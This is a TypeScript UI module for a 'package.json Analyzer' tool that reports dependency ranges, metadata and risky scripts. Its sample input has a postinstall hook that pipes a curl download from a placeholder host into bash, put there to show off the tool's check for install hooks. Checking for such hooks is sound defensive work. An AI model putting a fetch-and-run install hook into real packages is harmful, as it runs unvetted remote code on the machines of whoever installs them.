import {
  actions,
  badge,
  button,
  card,
  cards,
  copyButton,
  field,
  findings,
  findingRow,
  note,
  panel,
  stat,
  stats,
  textarea,
  toolLayout,
} from '../../core/components'
import { el } from '../../core/dom'
import type { Tool } from '../../core/types'
import { download } from '../../core/ui'
import { analysePackage, groupByKind, suggestions, type PackageReport } from './package'

const SAMPLE = JSON.stringify(
  {
    name: 'example-app',
    version: '0.1.0',
    type: 'module',
    scripts: { dev: 'vite', build: 'tsc && vite build', postinstall: 'curl -s https://example.com/setup.sh | bash' },
    dependencies: { react: '^18.2.0', lodash: '~4.17.21', old: '*' },
    devDependencies: { typescript: '5.4.5', vite: 'latest' },
  },
  null,
  2,
)

const tool: Tool = {
  slug: 'package-json-analyzer',
  name: 'package.json Analyzer',
  description: 'Review dependency ranges, scripts and metadata for a package.json.',
  category: 'Code',
  keywords: ['npm', 'package.json', 'dependencies', 'semver', 'scripts', 'node', 'audit'],
  render(root) {
    const input = textarea({ rows: 16, value: SAMPLE, onInput: () => run() })
    const error = note('', 'danger')
    error.hidden = true
    const readout = stats()
    const meta = el('div', { class: 'ts-k-actions' })
    const riskList = findings()
    const groups = cards()
    const scripts = cards()
    const advice = cards()
    let report = ''

    function render(current: PackageReport) {
      readout.replaceChildren(
        stat({ label: 'Dependencies', value: String(current.counts.dependencies) }),
        stat({ label: 'Dev', value: String(current.counts.devDependencies) }),
        stat({ label: 'Peer', value: String(current.counts.peerDependencies) }),
        stat({ label: 'Optional', value: String(current.counts.optionalDependencies) }),
      )

      const present: [string, boolean][] = [
        ['private', current.private],
        ['license', current.license !== null],
        ['engines', current.metadata.engines],
        ['repository', current.metadata.repository],
        ['files', current.metadata.files],
        ['types', current.metadata.types],
        ['exports', current.metadata.exports],
        ['packageManager', current.packageManager !== null],
      ]
      meta.replaceChildren(
        el('span', { class: 'ts-k-card__title' }, `${current.name ?? 'unnamed'} ${current.version ?? ''}`.trim()),
        ...present.map(([label, has]) => badge(`${has ? '' : 'no '}${label}`, has ? 'ok' : 'neutral')),
      )

      riskList.replaceChildren(
        ...(current.risks.length
          ? current.risks.map((risk) => findingRow({ status: 'Check', tone: 'warn', name: risk, message: 'Loose range or risky install hook.' }))
          : [note('No loose ranges or risky scripts found.', 'ok')]),
      )

      groups.replaceChildren(
        ...groupByKind(current.dependencies).map((group) =>
          card({ title: group.kind, meta: String(group.count) }, el('code', {}, group.names.join(', '))),
        ),
      )

      scripts.replaceChildren(
        ...(current.scripts.length
          ? current.scripts.map((script) =>
              card(
                { title: script.name, meta: script.lifecycle ? 'lifecycle' : undefined },
                el('code', { class: 'ts-k-hint' }, script.command),
                ...script.risks.map((risk) => note(risk, 'warn')),
              ),
            )
          : [note('No scripts.')]),
      )

      const tips = suggestions(current)
      advice.replaceChildren(...(tips.length ? tips.map((tip) => note(tip.message, tip.level === 'warning' ? 'warn' : 'neutral')) : [note('Nothing obvious to add.', 'ok')]))

      report = [
        `${current.name ?? 'unnamed'} ${current.version ?? ''}`.trim(),
        `dependencies: ${current.counts.dependencies}, dev: ${current.counts.devDependencies}, peer: ${current.counts.peerDependencies}, optional: ${current.counts.optionalDependencies}`,
        '',
        'Risks:',
        ...(current.risks.length ? current.risks.map((risk) => `- ${risk}`) : ['- none']),
        '',
        'Suggestions:',
        ...tips.map((suggestion) => `- [${suggestion.level}] ${suggestion.message}`),
      ].join('\n')
    }

    function run() {
      error.hidden = true
      try {
        render(analysePackage(input.value))
      } catch (err) {
        error.textContent = err instanceof Error ? err.message : 'Could not read that package.json.'
        error.hidden = false
      }
    }

    root.append(
      toolLayout(
        { wide: true },
        panel({ title: 'package.json', icon: 'file' }, field(input, { label: 'package.json' }), error),
        panel({ title: 'Summary', icon: 'info' }, readout, meta),
        panel({ title: 'Worth a look', icon: 'alert' }, riskList),
        panel({ title: 'Version ranges', icon: 'layers' }, groups),
        panel({ title: 'Scripts', icon: 'terminal' }, scripts),
        panel(
          { title: 'Suggestions', icon: 'sparkle' },
          advice,
          actions(copyButton(() => report, { label: 'Copy report', size: 'sm' }), button('Download report', { icon: 'download', onClick: () => download('package-report.txt', report) })),
        ),
        note('No registry is contacted, so version ranges are judged on how they are written rather than what exists. Scripts are scanned for install hooks that fetch and run remote code.'),
      ),
    )

    run()
  },
}

export default tool
